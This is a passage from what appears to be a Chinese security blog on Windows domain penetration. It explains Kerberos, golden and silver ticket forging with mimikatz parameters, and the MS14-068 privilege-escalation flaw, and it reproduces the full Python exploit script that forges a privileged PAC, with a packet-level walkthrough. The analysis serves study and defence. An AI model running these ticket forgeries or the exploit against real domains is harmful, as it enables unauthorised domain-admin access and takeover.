2000中引入）(secur32.dll) - Negotiate安全包在Kerberos和NTLM之间进行选择协商选择。Negotiate默认使用Kerberos，当Kerberos不能被身份验证中涉及的某个系统使用时，将使用NTLM。 摘要SSP（Windows XP中引入）(wdigest.dll) - 在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询/响应。 凭据 (CredSSP)（Windows Vista中引入，Windows XP SP3上也可用）(credssp.dll) - 为远程桌面连接提供单点登录（SSO）和网络级身份验证。 参考： https://zh.wikipedia.org/wiki/SSPI Kerberos形象化理解&emsp;Kerberos协议中主要涉及到Client、AS（也被称为KDC）、TGS、SS。我们形象化到我们的生活中，可以分别理解为4个主体：张三（Client）、公安局（AS）、房管局（TGS）、售楼部（SS）。&emsp;这里以买房子为例，张三到售楼部买房子，但是售楼部是需要张三提供房管局签发的允许购房证明；张三到了房管局，但是房管局为了确认张三的身份，需要张三到公安局开一张个人身份证明（ 公安局为了这个证明不用做其他用途，将这个证明加了密的，只有公安局能够解开；想要查验这个证明是否有效，需要房管局向公安局查验 ）。当然上述流程是一个逆向去开证明的流程，为了不多跑路，这个流程一开始就是公开的。所以正常的步骤应该是： 张三到公安局开身份证明（Client-&gt;AS） 公安局给张三签发只公安局能看懂的身份证明（AS-&gt;Client，TGT票据） 张三拿着公安局给的证明去房管局开允许购房证明 （Client-&gt;TGS） 房管局给张三签发只有房管局能看懂的允许购房证明 （TGS-&gt;Client，ST票据） 张三拿着房管局的允许购房证明去售楼部买房（Client-&gt;SS） 售楼部向房管局查验证明通过后，张三就可以买房了（SS-&gt;Client） Kerberos协议具体介绍&emsp;Authentication Server： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。&emsp;Ticket Granting Server： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（ST）。ST（Service Ticket）也有资料称为TGS Ticket。&emsp;名词解析： KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS AS(Authentication Server):身份认证服务 TGS(Ticket Granting Server):票据授予服务,该服务提供的票据也称为 TGS 或者叫白银票据，也被称为ST。 TGT(Ticket Granting Ticket):由身份认证服务授予的票据(黄金票据)，用于身份认证，存储在内存，默认有效期为10小时 &emsp;Kerberos认证流程简化如下（具体数据包解析传送门） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471. KRB_AS_REQ Client -&gt; Server(AS) 认证服务 Message0: 加密: client_secret_key 数据: Realm,principal,IP,Pre-authentication data... 2. KRB_AS_RSP Server(AS) 认证服务 -&gt; Client Message1: 加密: client_secret_key 数据: TGS name,TGS_session_key Message2(访问TGS的票据TGT): Client解密不了 加密: TGS_secret_key(krbtgt_hash) 数据: Username,TGS Name,TGS_session_key... 3. KRB_TGS_REQ Client -&gt; Server(TGS) 票据授权服务 Message3: Client解密不了 加密: 由上一步服务端使用 TGS_secret_key(krbtgt_hash) 加密 数据: 直接转发Message2(访问TGS的票据TGT) Message4: 加密: TGS_session_key 数据: authenticator 4. KRB_TGS_RSP Server(TGS) 认证服务 -&gt; Client Message5(访问SS的票据ST): Client解密不了 加密: Service_Secret_Key 数据: Service_Session_Key Message6: 加密: TGS_session_key 数据: Service_Session_Key 5. KRB_AP_REQ Client -&gt; Server(SS) 应用服务 Message5(访问SS的票据ST): Client解密不了 加密: Service_Secret_Key 数据: Username,Service Name,Service_Session_Key Message7: 加密: Service_Session_Key 数据: authenticator 6. KRB_AP_RSP Server(SS) 应用服务 -&gt; Client Message8: 加密方式: Service_Session_Key 数据: authenticator 下面是三张详细的Kerberos认证过程流程图： Kerberos拓展阅读 PAC数据结构 PAC在Kerberos认证协议中的作用（一） PAC在Kerberos认证协议中的作用(二) 了解Microsoft Kerberos PAC验证 Kerberos协议探索系列之票据篇 黄金票据什么是TGT票据&emsp;TGT票据，ticket-granting-tickets，是客户端通过身份认证服务器(AS)的认证之后，AS签发给Client的一个身份票据，可以使用这个凭据访问其他服务（TGS要检查这个TGT是否拥有将要访问服务的权限）。通过windows自带命令klist，可以查看本机缓存的TGT票据，或者使用这个Powershell脚本来查看本机的票据。结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445Kerberos Tickets for LogonID 0x74bba*****************************Logon Type: 5Session ID: 0x74bbaAuth Method: KerberosCurrent LogonId is 0:0x21957b6Targeted LogonId is 0:0x74bbaCached TGT:ServiceName : krbtgtTargetName (SPN) : krbtgtClientName : adfsDomainName : RCBJ.NETTargetDomainName : RCBJ.NETAltTargetDomainName: RCBJ.NETTicket Flags : 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalizeSession Key : KeyType 0x12 — AES-256-CTS-HMAC-SHA1–96 : KeyLength 32–25 2b a5 21 cb 56 5f f1 f6 ad e9 35 73 7b 31 06 2e e8 8e 67 f7 bb 9f 24 a7 a5 50 fdd8 d0 43 48StartTime : 9/6/2018 23:23:25 (local)EndTime : 9/7/2018 9:23:25 (local)RenewUntil : 9/9/2018 2:27:40 (local)TimeSkew : + 0:00 minute(s)EncodedTticket : (size: 1003)0000 61 82 03 e7 30 82 03 e3:a0 03 02 01 05 a1 0a 1b a…0………..0010 08 52 43 42 4a 2e 4e 45:54 a2 1d 30 1b a0 03 02 .RCBJ.NET..0….0020 01 02 a1 14 30 12 1b 06:6b 72 62 74 67 74 1b 08 ….0…krbtgt..0030 52 43 42 4a 2e 4e 45 54:a3 82 03 af 30 82 03 ab RCBJ.NET….0…0040 a0 03 02 01 12 a1 03 02:01 02 a2 82 03 9d 04 82 …………….0050 03 99 6f 06 82 a8 18 3f:60 c7 b2 b7 2a 2b 18 e5 ..o….?`…*+..Ticket #0 : @&#123;Client=adfs @ RCBJ.NET; Server=krbtgt/RCBJ.NET @ RCBJ.NET; KerbTicket Encryption Type=AES-256-CTS-HMAC-SHA1–96; Ticket Flags=0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize ; Start Time=9/6/2018 23:23:25 (local); End Time=9/7/2018 9:23:25 (local); Renew Time=9/9/2018 2:27:40 (local); Session Key Type=AES-256-CTS-HMAC-SHA1–96&#125;Ticket #1 : @&#123;Client=adfs @ RCBJ.NET; Server=krbtgt/RCBJ.NET @ RCBJ.NET; KerbTicket Encryption Type=AES-256-CTS-HMAC-SHA1–96; Ticket Flags=0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize ; Start Time=9/2/2018 2:27:49 (local); End Time=9/2/2018 12:27:40 (local); Renew Time=9/9/2018 2:27:40 (local); Session Key Type=AES-256-CTS-HMAC-SHA1–96&#125;Ticket #2 : @&#123;Client=adfs @ RCBJ.NET; Server=ldap/EC2AMAZ-A6G81N3.rcbj.net @ RCBJ.NET; KerbTicket Encryption Type=AES-256-CTS-HMAC-SHA1–96; Ticket Flags=0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize ; Start Time=9/7/2018 1:38:28 (local); End Time=9/7/2018 9:23:25 (local); Renew Time=9/9/2018 2:27:40 (local); Session Key Type=AES-256-CTS-HMAC-SHA1–96&#125;Ticket #3 : @&#123;Client=adfs @ RCBJ.NET; Server=ldap/EC2AMAZ-A6G81N3.rcbj.net/rcbj.net @ RCBJ.NET; KerbTicket Encryption Type=AES-256-CTS-HMAC-SHA1–96; Ticket Flags=0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize ; Start Time=9/6/2018 23:28:02 (local); End Time=9/7/2018 9:23:25 (local); Renew Time=9/9/2018 2:27:40 (local); Session Key Type=AES-256-CTS-HMAC-SHA1–96&#125; 黄金票据原理&emsp;黄金票据的漏洞主要出现在kerberos认证过程中的KRB_TGS_REQ请求过程中，我们如果拥有krbtgt账号的密码哈希，我们则可以伪造成域内的任意用户。&emsp;Golden Ticket（下面称为黄金票据）是伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。通过前面的分析，认识到TGT是AS签发给Client的，并且是使用AS的用户密码hash进行加密（在域中默认为krbtgt）；所以只要知道了krbtgt账号密码的hash，就可以进行任意票据伪造。&emsp;当用户与AS(KDC)之间完成了认证过程之后， Client需要访问Server所提供的某项服务时， Server为了判断用户是否具有合法的权限需要将Client的User SID等信息传递给AS(KDC)， AS(KDC)通过SID判断用户的用户组信息， 用户权限等， 进而将结果返回给Server， Server再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。&emsp;认识了上述票据的权限认证原理后，我们知道票据的权限主要是取决于票据中保存的用户的SID，因为AS判断权限时，时通过票据中用户的SID进行判断的。SID的末尾为RID，是域用户的唯一对象标识。点击这里查看常见SID含义。 ADMINISTRATOR SID：S-1-5-21 -500 管理员组：S-1-5-21-DOMAINID-513 域用户SID：S-1-5-21-DOMAINID-513 域管理员SID：S-1-5-21-DOMAINID-512 架构管理员SID：S-1-5-21-DOMAINID-518 企业管理员SID：S-1-5-21-DOMAINID-519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数） 组策略创建者所有者SID：S-1-5-21 -520 黄金票据利用条件 域名称 域SID值，注意是去掉最后一个-后面的值 域KRBTGT账户密码HASH 伪造用户名，可以是任意的 黄金票据利用过程 使用mimikatz抓取krbtgt用户的密码HASH及域SID 使用mimikatz伪造票据并注入到session 查看当前Session的权限 使用psexec在DC上执行命令 白银票据白银票据原理白银票据的漏洞主要出现在kerberos认证过程中的KRB_AP_REQ请求过程中，我们如果拥有ServiceAccount账号的密码哈希，我们则可以域内的任意用户去访问对应的服务。白银票据(Silver Tickets)是伪造Kerberos中授予访问服务（Service Ticket）的票据（服务票据，简称ST）。使用服务票据可以直接访问服务，与域控制器没有KRB_AS_REQ/KRB_AS_REP，也没有KRB_TGS_REQ/KRB_TGS_REP通信。由于银票是伪造的ST，所以没有与域控制器通信。 白银票据的特点1.白银票据是一个有效的服务票据（ST），因为Kerberos验证服务票据是通过服务帐户密码哈希进行加密和签名的。2.黄金票据是伪造TGT，从而可以访问任意计算机和服务。而白银票据是伪造ST。这意味着白银票据只能访问特定服务器上的任何服务。3.大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效ST可以完全伪造PAC。4.攻击者需要服务帐户密码哈希值。5.TGS是伪造的，所以没有和TGT通信，意味着绕过DC的身份验证。6.任何事件日志都在目标服务器上。 白银票据利用条件 /domain:lab.adsecurity.org 所在域的域名称 /sid:S-1-5-21-1473643419-774954089-2222329127 所在域的域SID，可通过 lsadump::lsa 获取 /admin:LukeSkywalker 伪造的账号名称（如： Administrator ） /target:adsmswin2k8r2.lab.adsecurity.org 指定要访问的目标服务/计算机的路径 /service:cifs 要访问的服务名（如cifs,HOST…） rc4:d7e2b80507ea074ad59f152a1ba20458 目标计算机账号（机器名$，或对应服务账号，如 MS SQL ）的 Hash 白银票据的对应的服务列表 服务类型 白银票据对应的服务名 WMI HOST/RPCSS PowerShell Remoting HOST/HOST WinRM HOST/HTTP Scheduled Tasks HOST Windows File Share (CIFS) CIFS LDAP operations including Mimikatz DCSync LDAP Windows Remote Server Administration Tools RPCSS/LDAP/CIFS 白银票据利用过程详细利用过程传送门 为”HOST”服务创建白银票据，以获得目标计算机上计划任务的修改和创建计划权限。在创建白银票据中的/service参数为HOST。 利用HOST Silver Ticket，我们可以创建一个新的计划任务。 ms14068漏洞分析什么是PAC&emsp;PAC的全称是Privilege Attribute Certificate(特权属性证书)， 其中所包含的是各种授权信息， 例如用户所属的用户组， 用户所具有的权限等。&emsp;当用户与AS(KDC)之间完成了认证过程之后， 用户需要访问服务器所提供的某项服务时， 服务器为了判断用户是否具有合法的权限，就必须通过将用户的用户名传递给AS(KDC)， AS(KDC)通过得到的用户名查询用户的用户组信息， 用户权限等， 进而返回给服务器， 服务器再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。&emsp;上述步骤是，如果没有PAC，则会使客户端访问指定的服务过程中，服务端会多次向AS(KDC)进行身份验证，这也就失去了第一步KRB_AS_REQ的意义。&emsp;为了在授权中不多次进行身份认证，在Windows的Kerberos实现中，使用了PAC，从而只需要在需要身份验证时，去检验PAC的校验是否正确。默认情况下，KRB_AS_REP信息中将包含一组PAC信息， 也就是说， 用户所得到的TGT（TicketGranting Ticket）会包含用户的授权信息。用户再用包含有授权信息的TGT去申请相应的Service Ticket，AS(KDC)在收到这个KBR_AP_REQ请求的时候， 将TGT里的PAC信息解析出来， 加入到Service Ticket里返回。接下来， 当用户向服务器程序提交KRB_AP_REQ消息时， 服务器程序则将其中所包含的PAC信息传送给操作系统得到一个访问令牌， 并且同时将这个PAC的数字签名以KRB_VERIFY_PAC的消息传输给AS(KDC)， AS(KDC)再将验证这个PAC的数字签名的结果以RPC返回码的形式告诉服务器， 服务器就可以根据这个结果判断PAC数据的真实性和完整性，并做出最后对KRB_AP_REQ的判断。&emsp;但是，PAC的引入并不是百利而无一害的，PAC在用户的认证阶段引入会导致认证耗时过长。这个问题是因为相较其他的实现，Windows Kerberos客户端会通过RPC调用KDC上的函数来验证PAC信息，这时候用户会观察到在服务器端与KDC之间的RPC包流量的增加。而另一方面， 由于PAC是微软特有的一个特性，所以启用了PAC的域中将不支持装有其他操作系统的服务器， 制约了域配置的灵活性。&emsp;所以，对于PAC的使用还是由用户的应用特性来决定，如果需要减少服务器和KDC之间的认证信息流量从而使得用户能够更快的访问到所需要的资源，我们可以启用PAC；而另一方面，如果用户所属的组非常多，PAC信息本身所占用的容量会变得非常大，使得在做PAC认证的时候，服务器和KDC之间的数据通信变的异常频繁，用户可能因此在认证阶段耗时过长，那么我们就可以考虑禁用PAC来加快验证速度。 漏洞原理&emsp;通过上面对黄金票据的分析，我们知道了AS对于票据权限的检查，是基于票据中用户SID来进行的。所以如果我们能更改票据中的SID值，就能够将域用户进行提权。黄金票据漏洞可以修改SID，主要条件是知道域的SID和krbtgt账号密码的Hash，从而可以构造任意TGT票据。而ms14068不是通过黄金票据进行域用户提权的。&emsp;其大概原理为，Client向AS(KDC)发送KRB_AS_REQ请求时，申请一张不包含PAC的TGT票据。并在Client向TGS发送KRB_TGS_REQ请求时，重新构造高权限TGT及PAC发送给TGS，TGS会返回一个新的TGT。&emsp;漏洞利用的关键点: 在域中默认允许设置Include-pac的值为False（不能算漏洞，应该是微软对于某些特定场景的特殊考虑设计出的机制）。 PAC中的数字签名可以由Client端指定，并且Key的值可以为空。 PAC的加密方式也可以由Client指定，并且Key的值为generate_subkey函数生成的16位随机数。 构造的PAC中用户是高权限组的SID。 漏洞利用参数说明：(EXP传送门) -u 域账号+@+域名称，这里是ts1+@+yunying.lab -p 为当前用户的密码，即ts1的密码 -s 为ts1的SID值，可以通过whoami /all来获取用户的SID值 -d 为当前域的域控 使用EXP伪造PAC，获取TGT票据 清除本地缓存的票据，并导入上一步获取的新票据 访问原来普通账号不能访问的域控共享文件 EXP源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178#!/usr/bin/pythonimport sys, osfrom random import getrandbitsfrom time import time, localtime, strftimefrom kek.ccache import CCache, get_tgt_cred, kdc_rep2ccachefrom kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \\ decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \\ AD_WIN2K_PACfrom kek.pac import build_pac, pretty_print_pacfrom kek.util import epoch2gt, gt2epochdef sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None): sys.stderr.write(' [+] Building AS-REQ for %s...' % kdc_a) sys.stderr.flush() nonce = getrandbits(31) current_time = time() as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Sending AS-REQ to %s...' % kdc_a) sys.stderr.flush() sock = send_req(as_req, kdc_a) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Receiving AS-REP from %s...' % kdc_a) sys.stderr.flush() data = recv_rep(sock) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Parsing AS-REP from %s...' % kdc_a) sys.stderr.flush() as_rep, as_rep_enc = decrypt_as_rep(data, user_key) session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue'])) logon_time = gt2epoch(str(as_rep_enc['authtime'])) tgt_a = as_rep['ticket'] sys.stderr.write(' Done!\\n') if krbtgt_a_key is not None: print &gt;&gt; sys.sdterr, as_rep.prettyPrint() print &gt;&gt; sys.stderr, as_rep_enc.prettyPrint() ticket_debug(tgt_a, krbtgt_a_key) sys.stderr.write(' [+] Building TGS-REQ for %s...' % kdc_a) sys.stderr.flush() subkey = generate_subkey() nonce = getrandbits(31) current_time = time() pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time)) tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name, tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Sending TGS-REQ to %s...' % kdc_a) sys.stderr.flush() sock = send_req(tgs_req, kdc_a) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Receiving TGS-REP from %s...' % kdc_a) sys.stderr.flush() data = recv_rep(sock) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Parsing TGS-REP from %s...' % kdc_a) tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey) session_key2 = (int(tgs_rep_enc['key']['keytype']), str(tgs_rep_enc['key']['keyvalue'])) tgt_b = tgs_rep['ticket'] sys.stderr.write(' Done!\\n') if trust_ab_key is not None: pretty_print_pac(pac[1]) print &gt;&gt; sys.stderr, tgs_rep.prettyPrint() print &gt;&gt; sys.stderr, tgs_rep_enc.prettyPrint() ticket_debug(tgt_b, trust_ab_key) if target_service is not None and target_host is not None and kdc_b is not None: sys.stderr.write(' [+] Building TGS-REQ for %s...' % kdc_b) sys.stderr.flush() subkey = generate_subkey() nonce = getrandbits(31) current_time = time() tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name, tgt_b, session_key2, subkey, nonce, current_time) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Sending TGS-REQ to %s...' % kdc_b) sys.stderr.flush() sock = send_req(tgs_req2, kdc_b) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Receiving TGS-REP from %s...' % kdc_b) sys.stderr.flush() data = recv_rep(sock) sys.stderr.write(' Done!\\n') sys.stderr.write(' [+] Parsing TGS-REP from %s...' % kdc_b) tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey) sys.stderr.write(' Done!\\n') else: tgs_rep2 = tgs_rep tgs_rep_enc2 = tgs_rep_enc sys.stderr.write(' [+] Creating ccache file %r...' % output_filename) cc = CCache((user_realm, user_name)) tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2) cc.add_credential(tgs_cred) cc.save(output_filename) sys.stderr.write(' Done!\\n') if target_key is not None: print &gt;&gt; sys.stderr, tgs_rep2.prettyPrint() print &gt;&gt; sys.stderr, tgs_rep_enc2.prettyPrint() ticket_debug(tgs_rep2['ticket'], target_key)# Pretty print full ticket content# Only possible in a lab environment when you already know krbtgt and/or service keysdef ticket_debug(ticket, key): try: ticket_enc = decrypt_ticket_enc_part(ticket, key) print &gt;&gt; sys.stderr, ticket.prettyPrint() for ad in iter_authorization_data(ticket_enc['authorization-data']): print &gt;&gt; sys.stderr, 'AUTHORIZATION-DATA (type: %d):' % ad['ad-type'] if ad['ad-type'] == AD_WIN2K_PAC: pretty_print_pac(str(ad['ad-data'])) else: print &gt;&gt; sys.stderr, str(ad['ad-data']).encode('hex') except Exception as e: print 'ERROR:', eif __name__ == '__main__': from getopt import getopt from getpass import getpass def usage_and_exit(): print &gt;&gt; sys.stderr, 'USAGE:' print &gt;&gt; sys.stderr, '%s -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;' % sys.argv[0] print &gt;&gt; sys.stderr, '' print &gt;&gt; sys.stderr, 'OPTIONS:' print &gt;&gt; sys.stderr, ' -p &lt;clearPassword&gt;' print &gt;&gt; sys.stderr, ' --rc4 &lt;ntlmHash&gt;' sys.exit(1) opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4=']) opts = dict(opts) if not all(k in opts for k in ('-u', '-s', '-d')): usage_and_exit() user_name, user_realm = opts['-u'].split('@', 1) user_sid = opts['-s'] kdc_a = opts['-d'] if '--rc4' in opts: user_key = (RC4_HMAC, opts['--rc4'].decode('hex')) assert len(user_key[1]) == 16 elif '-p' in opts: user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest()) else: user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest()) target_realm = user_realm target_service = target_host = kdc_b = None filename = 'TGT_%s@%s.ccache' % (user_name, user_realm) user_realm = user_realm.upper() target_realm = target_realm.upper() sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename) 漏洞利用过程分析MS14068工具在使用过程中抓包可以看到s1和域控192.168.254.130（实质上是与安装在域控上的KDC）有KRB_AS_REQ,KRB_AS_REP,KRB_TGS_REQ,KRB_TGS_REP四次交互。 下面根据流程和源码来看漏洞是如何利用的: KRB_AS_REQ1as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False) 首先程序通过 build_as_req 函数构建AS_REQ，在这里可以看到，参数pac_request设置为false。也就是说设置了这个参数之后会向KDC申请一张不包含PAC的TGT票据，这是微软默认的设计。 通过PCAP包可以更直观的看到在AS-REQ请求中的include-pac:False字段。这是造成这个漏洞的第一个因素。 KRB_AS_REP1tgt_a = as_rep['ticket'] 在AS发起请求之后，KDC（AS）将返回一张不包含有PAC的TGT票据给Client。在这里是tgt_a。抓包可以看到这个以268fdb开头的TGT票据： KRB_TGS_REQ攻击脚本使用了两个关键函数来实现这个过程，首先通过 build_pac 函数构造PAC，然后通过 build_tgs_req 函数构造TGS-REQ的内容。 build_pac当Client接收到AS返回的不带有PAC的TGT之后通过脚本中的build_pac函数开始构造PAC。 这里我们重点关注一下PAC中的chksum1和chksum2，也就是“PAC的引入”中提到的PAC的两个数字签名PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM。注意一下其中第一个参数server_key[0]和kdc_key[0]的值其实是程序指定的RSA_MD5，而Key的值为None，但原则上来说这个加密方式是应该由AS(KDC)来确定的。也就是说加密PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM这两个数字签名的Key应该分别是Server密码HASH和AS(KDC)密码HASH，在这里却直接使Key为None，然后直接使用RSA_MD5方式加密。 同时在这个过程中我们也需要关注一下user_sid这个参数，build_pac函数会将其分割，然后重新构造高权限的sid的值。在这里user_sid的值为S-1-5-21-4249968736-1423802980-663233003-1104，分割之后domain_sid为S-1-5-21-4249968736-1423802980-663233003，user_id为1104。 其中512、520、518、519分别为不同的组的sid号。512为DOMAIN ADMINS组。通过这种方式构造了包含高权限组SID的PAC。 build_tgs_req12tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name, tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False) 在build_tgs_req函数的参数中，authorization_data对应的为build_pac生成的pac。这里将PAC传入build_tgs_req之后使用subkey将其加密。而通过下图可以看到subkey其实是函数generate_subkey生成的一串16位的随机数。 通过抓包可以看到在这个过程中将接收的TGT（268fdb开头）和加密方式为ARCFOUR-HMAC-MD5的PAC内容: KRB_TGS_REP1tgt_b = tgs_rep['ticket'] AS(KDC)在对伪造的PAC验证成功之后，返回给Client端一有新的TGT，并且这个TGT会将EXP生成的PAC包含在其中，这里正常情况下返回的其实是一张用于发送给Server端做认证的ST票据。当Exp接收到新的TGT之后就将其保存生成ccache文件。也就是说这时Client已经获得了一张包含有高权限PAC内容的正常的TGT票据（564eab开头）： 使用Mimikatz利用TGT访问DC共享文件夹通过mimikatz来导入上面得到的TGG票据，并且用dir \\dc.yunying.lab\\c$来访问域控的共享文件夹： 抓包可以看到这时Client端发起了两次TGS-REQ请求，重点关注一下第一次，此时用的票据就是使用mimikatz导入的TGT，也就是上面KRB_TGS_REP过程中返回的那个tgt_b（564eab开头）： 请求之后返回了一张针对dc.yunying.lab（域控）的CIFS票据也就是正常流程中的ST（Service Ticket）票据（234062开头）： 这时在抓的包中发现并没有AP_REQ这个流程，是因为在Kerberos中AP_REQ这个过程放在了服务的第一次请求中，这里是放在SMB的Session Setup Request中（其他协议同理，比如HTTP协议是放在GET请求中）： 然后在SMB的Session Setup Response中做出响应，也就是AP-REP这个流程： 上述流程完成，Client就能够越权访问域控的共享文件夹了。","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://lahonja.me/categories/内网渗透/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://lahonja.me/tags/Windows/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://lahonja.me/tags/漏洞分析/"},{"name":"协议分析","slug":"协议分析","permalink":"http://lahonja.me/tags/协议分析/"}]}],"categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://lahonja.me/categories/漏洞分析/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://lahonja.me/categories/内网渗透/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://lahonja.me/tags/Windows/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://lahonja.me/tags/漏洞分析/"},{"name":"CVE-2019-0808","slug":"CVE-2019-0808","permalink":"http://lahonja.me/tags/CVE-2019-0808/"},{"name":"协议分析","slug":"协议分析","permalink":"http://lahonja.me/tags/协议分析/"}]}